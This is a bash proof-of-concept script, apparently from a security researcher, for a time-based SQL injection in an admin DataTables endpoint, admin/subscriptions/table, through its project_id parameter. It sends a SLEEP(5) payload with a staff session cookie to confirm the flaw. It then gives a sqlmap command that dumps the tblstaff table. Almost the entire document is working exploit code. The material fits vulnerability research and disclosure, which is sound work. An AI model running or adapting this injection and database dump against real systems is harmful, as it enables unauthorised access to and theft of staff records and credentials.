#!/usr/bin/env bash
# VULN-03 — DataTables SQL injection (time-based confirm + sqlmap hint)
# Researcher: tal7aouy
# Usage: ./poc.sh https://target "<staff_session_cookie>"
set -euo pipefail
TARGET="${1:-http://localhost}"
COOKIE="${2:-}"

echo "[*] VULN-03 — time-based confirmation on admin/subscriptions/table (project_id)"
echo "[*] Baseline request timing:"
curl -sk -H "Cookie: $COOKIE" -o /dev/null -w "    normal: %{time_total}s\n" \
  "${TARGET%/}/admin/subscriptions/table?project_id=1"

echo "[*] Injected SLEEP(5) request timing:"
curl -sk -H "Cookie: $COOKIE" -o /dev/null -w "    inject: %{time_total}s\n" \
  --data-urlencode "start=0" --data-urlencode "length=10" \
  -G --data-urlencode "project_id=(SELECT SLEEP(5))" \
  "${TARGET%/}/admin/subscriptions/table"

cat <<TXT

[*] If the injected request is ~5s slower, injection is confirmed.
[*] Full dump with sqlmap:
    sqlmap -u "${TARGET%/}/admin/subscriptions/table?project_id=1" \\
           --cookie="$COOKIE" -p project_id --dbms mysql --dump -T tblstaff
TXT
